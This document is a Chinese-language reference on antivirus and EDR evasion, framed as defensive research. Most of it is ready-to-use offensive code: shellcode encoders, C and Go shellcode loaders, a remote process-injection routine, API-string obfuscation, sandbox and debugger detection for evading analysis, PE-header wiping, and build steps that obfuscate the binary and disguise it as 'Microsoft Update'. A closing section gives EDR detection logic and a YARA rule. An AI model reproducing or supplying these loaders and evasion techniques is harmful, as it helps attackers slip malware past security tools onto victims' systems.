# 免杀与绕过技术参考（防御研究视角）

## 基本概念

免杀（AV/EDR Evasion）研究的目的：
- 理解攻击者技术，帮助防御方完善检测规则
- 红队演练测试防御有效性
- 安全产品研发和测试

检测层次：
```
静态检测  → 签名/哈希/熵值/字符串匹配
启发式    → 代码行为模式分析
行为检测  → 运行时API调用监控 (EDR)
内存扫描  → 运行中进程内存特征
网络检测  → C2通信流量特征
```

---

## 静态免杀

### 混淆与编码

```python
# Shellcode 编码器（AV签名绕过原理）
import random, struct

def xor_encode(shellcode: bytes, key: int = None) -> tuple[bytes, int]:
    if key is None:
        key = random.randint(1, 255)
    encoded = bytes(b ^ key for b in shellcode)
    return encoded, key

def xor_decoder_stub_c() -> str:
    """生成C语言XOR解码桩代码"""
    return '''
unsigned char decode(unsigned char *buf, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        buf[i] ^= key;
    }
    return 0;
}
'''

# 多字节 XOR
def multibyte_xor(data: bytes, key: bytes) -> bytes:
    return bytes(b ^ key[i % len(key)] for i, b in enumerate(data))

# RC4 加密（常见于免杀 loader）
from Crypto.Cipher import ARC4

def rc4_encrypt(data: bytes, key: bytes) -> bytes:
    return ARC4.new(key).encrypt(data)

# UUID 编码（绕过字节特征扫描）
import uuid

def shellcode_to_uuids(shellcode: bytes) -> list[str]:
    """将 shellcode 编码为 UUID 字符串列表"""
    padded = shellcode + b'\x00' * (16 - len(shellcode) % 16) if len(shellcode) % 16 else shellcode
    uuids = []
    for i in range(0, len(padded), 16):
        chunk = padded[i:i+16]
        u = uuid.UUID(bytes_le=chunk)
        uuids.append(str(u))
    return uuids

def uuids_to_shellcode(uuids: list[str]) -> bytes:
    return b''.join(uuid.UUID(u).bytes_le for u in uuids)
```

### C/C++ Loader 模板

```c
// 基础 Shellcode Loader (Windows 研究用)
#include <windows.h>
#include <stdio.h>

// 编码后的 shellcode（运行时解码）
unsigned char enc_sc[] = { /* XOR 编码后的字节 */ };
unsigned char key = 0x41;

void decode(unsigned char *buf, int len, unsigned char k) {
    for (int i = 0; i < len; i++) buf[i] ^= k;
}

int main() {
    int sc_len = sizeof(enc_sc);
    
    // 解码
    decode(enc_sc, sc_len, key);
    
    // 分配可执行内存
    LPVOID mem = VirtualAlloc(NULL, sc_len, 
                              MEM_COMMIT | MEM_RESERVE, 
                              PAGE_EXECUTE_READWRITE);
    
    // 复制并执行
    memcpy(mem, enc_sc, sc_len);
    
    // 方式1: 直接调用
    ((void(*)())mem)();
    
    // 方式2: CreateThread
    HANDLE hThread = CreateThread(NULL, 0, 
                                  (LPTHREAD_START_ROUTINE)mem, 
                                  NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    
    return 0;
}
```

```c
// 进程注入 Loader（用于红队演练理解注入原理）
#include <windows.h>
#include <tlhelp32.h>

DWORD find_pid(const wchar_t *proc_name) {
    PROCESSENTRY32W pe = { sizeof(pe) };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    while (Process32NextW(snap, &pe)) {
        if (!wcscmp(pe.szExeFile, proc_name)) {
            CloseHandle(snap);
            return pe.th32ProcessID;
        }
    }
    CloseHandle(snap);
    return 0;
}

void inject(DWORD pid, unsigned char *sc, int sc_len) {
    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    
    // 在目标进程分配内存
    LPVOID remote_mem = VirtualAllocEx(proc, NULL, sc_len,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE);
    
    // 写入 shellcode
    WriteProcessMemory(proc, remote_mem, sc, sc_len, NULL);
    
    // 创建远程线程执行
    HANDLE hThread = CreateRemoteThread(proc, NULL, 0,
                                         (LPTHREAD_START_ROUTINE)remote_mem,
                                         NULL, 0, NULL);
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(proc);
}
```

### Go Loader（跨平台，常用于红队工具）

```go
package main

import (
    "encoding/hex"
    "os"
    "syscall"
    "unsafe"
    "golang.org/x/sys/windows"
)

// XOR 解码
func xorDecode(data []byte, key byte) []byte {
    result := make([]byte, len(data))
    for i, b := range data {
        result[i] = b ^ key
    }
    return result
}

func main() {
    // 编码后的 shellcode
    encoded, _ := hex.DecodeString("编码后的十六进制")
    sc := xorDecode(encoded, 0x41)

    // Windows API 调用（syscall 方式，规避部分静态检测）
    kernel32 := windows.NewLazySystemDLL("kernel32.dll")
    virtualAlloc    := kernel32.NewProc("VirtualAlloc")
    rtlMoveMemory   := kernel32.NewProc("RtlMoveMemory")
    createThread    := kernel32.NewProc("CreateThread")

    addr, _, _ := virtualAlloc.Call(0, uintptr(len(sc)),
        windows.MEM_COMMIT|windows.MEM_RESERVE,
        windows.PAGE_EXECUTE_READWRITE)

    rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&sc[0])), uintptr(len(sc)))

    hThread, _, _ := createThread.Call(0, 0, addr, 0, 0, 0)
    syscall.WaitForSingleObject(syscall.Handle(hThread), syscall.INFINITE)
}
```

---

## 行为免杀（EDR 绕过原理）

### API 调用混淆

```c
// 动态加载 API（避免 IAT 静态分析）
typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

pVirtualAlloc myVirtualAlloc = (pVirtualAlloc)GetProcAddress(
    GetModuleHandleA("kernel32.dll"), "VirtualAlloc"
);

// 字符串混淆 API 名（规避字符串扫描）
char api_name[] = { 'V'^0x10, 'i'^0x10, 'r'^0x10, 't'^0x10,
                    'u'^0x10, 'a'^0x10, 'l'^0x10, 'A'^0x10,
                    'l'^0x10, 'l'^0x10, 'o'^0x10, 'c'^0x10, 0 };
for (int i = 0; api_name[i]; i++) api_name[i] ^= 0x10;
pVirtualAlloc fn = (pVirtualAlloc)GetProcAddress(hKernel32, api_name);

// 直接系统调用（绕过 EDR 用户态 hook）
// EDR 通过 hook ntdll.dll 中的函数监控行为
// 直接 syscall 绕过 hook 层
// 工具: SysWhispers3, HellsGate, TartarusGate
```

### 沙箱检测规避

```c
// 检测沙箱环境（常见沙箱规避技术，用于了解恶意软件行为）
#include <windows.h>

BOOL is_sandbox() {
    // 1. 检测用户名
    char username[256];
    DWORD size = sizeof(username);
    GetUserNameA(username, &size);
    const char *sandbox_users[] = {"sandbox", "virus", "malware", "test", NULL};
    for (int i = 0; sandbox_users[i]; i++) {
        if (strstr(username, sandbox_users[i])) return TRUE;
    }
    
    // 2. 检测 CPU 核心数（沙箱通常 <=2 核）
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) return TRUE;
    
    // 3. 检测内存（沙箱通常 <2GB）
    MEMORYSTATUSEX ms = { sizeof(ms) };
    GlobalMemoryStatusEx(&ms);
    if (ms.ullTotalPhys < 2ULL * 1024 * 1024 * 1024) return TRUE;
    
    // 4. 检测运行时间（沙箱通常运行时间短）
    if (GetTickCount() < 10 * 60 * 1000) {  // <10分钟
        Sleep(10000);  // 延迟执行
        if (GetTickCount() < 10 * 60 * 1000) return TRUE;
    }
    
    // 5. 检测调试器
    if (IsDebuggerPresent()) return TRUE;
    
    // 6. 检测虚拟机
    // 检查注册表: HKLM\SOFTWARE\VMware, Inc.\VMware Tools
    // 检查进程: vmtoolsd.exe, vboxservice.exe
    
    return FALSE;
}
```

### 内存规避

```c
// 执行后清除 PE 头（减少内存扫描特征）
void erase_pe_header(HMODULE module) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    DWORD old_protect;
    VirtualProtect(dos, 0x1000, PAGE_READWRITE, &old_protect);
    ZeroMemory(dos, 0x1000);
    VirtualProtect(dos, 0x1000, old_protect, &old_protect);
}

// Sleep 掩码（Beacon 休眠时加密自身内存）
// Ekko / Foliage / Zymotic 等技术
// 原理: ROP 链触发 NtContinue → 加密内存 → 休眠 → 解密

// Phantom DLL Hollowing
// 1. 创建挂起进程
// 2. 卸载映射的 DLL
// 3. 用 shellcode 重新映射
// 4. 修复重定位表和 IAT
```

---

## 构建工具链

```bash
# 交叉编译 Windows 程序（Linux → Windows）
x86_64-w64-mingw32-gcc loader.c -o loader.exe -mwindows -s

# Go 交叉编译
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w -H windowsgui" -o loader.exe

# garble 混淆 Go 二进制
go install mvdan.cc/garble@latest
GOOS=windows GOARCH=amd64 garble -tiny -literals build -o loader.exe

# UPX 压缩（注意：UPX 本身是已知特征）
upx --ultra-brute loader.exe
upx -d loader.exe  # 解压

# 资源修改（伪装文件图标/版本信息）
# ResourceHacker (Windows)
# rcedit (跨平台)
./rcedit loader.exe --set-version-string "FileDescription" "Microsoft Update"
./rcedit loader.exe --set-icon app.ico
```

---

## 检测规则（蓝队）

### EDR 检测逻辑

```
高风险 API 调用序列：
VirtualAlloc(PAGE_EXECUTE) → WriteProcessMemory → CreateRemoteThread
→ 告警: 经典进程注入

NtMapViewOfSection → NtCreateThreadEx
→ 告警: Process Hollowing

SetWindowsHookEx(WH_KEYBOARD) 
→ 告警: 键盘记录

规避行为特征：
- 进程调用 Sleep(大值) 后执行敏感操作 → 沙箱检测
- 读取 CPUID/RDTSC → 虚拟机检测
- 枚举进程列表查找 AV 进程 → 对抗行为
```

### AMSI Bypass 检测

```powershell
# 检测 AMSI Bypass 尝试
# 常见 bypass: 修改 amsi.dll 内存中的 AmsiScanBuffer 函数
# 检测: 监控对 amsi.dll 的写操作

# Sysmon 规则
# Event ID 10 (ProcessAccess) - 进程访问 amsi.dll
# Event ID 8  (CreateRemoteThread)
# Event ID 25 (ProcessTampering)
```

### YARA 检测规则

```yara
rule Suspicious_Loader_Behavior {
    meta:
        description = "Detects common shellcode loader patterns"
    strings:
        // VirtualAlloc + Execute 组合
        $api1 = "VirtualAlloc" ascii
        $api2 = "VirtualProtect" ascii
        $api3 = "CreateThread" ascii
        
        // 进程注入
        $inject1 = "OpenProcess" ascii
        $inject2 = "WriteProcessMemory" ascii
        $inject3 = "CreateRemoteThread" ascii
        
        // 沙箱检测
        $sandbox1 = "IsDebuggerPresent" ascii
        $sandbox2 = "GetTickCount" ascii
        $sandbox3 = "GlobalMemoryStatusEx" ascii
        
        // 高熵区段特征 (加密/压缩 payload)
        $high_entropy = { 00 00 00 00 00 00 00 00 }  // placeholder
        
    condition:
        uint16(0) == 0x5A4D and
        (all of ($api*) or all of ($inject*)) and
        2 of ($sandbox*)
}
```
